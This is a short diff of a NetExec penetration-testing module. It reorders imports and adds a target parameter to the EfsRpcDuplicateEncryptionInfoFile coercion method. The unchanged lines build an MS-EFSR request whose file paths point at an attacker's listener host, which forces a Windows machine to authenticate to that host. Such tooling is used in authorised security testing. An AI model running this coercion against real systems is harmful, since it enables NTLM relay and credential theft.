@@ -1,8 +1,8 @@
 from impacket.dcerpc.v5.ndr import NDRCALL
 from impacket.dcerpc.v5.dtypes import WSTR, DWORD, BOOL
 
-from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError
 from nxc.modules.coerce_plus_method.MS_EFSR.dtypes import EFS_RPC_BLOB
+from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError
 
 
 class EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
@@ -23,7 +23,7 @@ class EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):
     structure = ()
 
 
-def request(dce, listener):
+def request(dce, target, listener):
     request = EfsRpcDuplicateEncryptionInfoFile()
     request["SrcFileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
     request["DestFileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
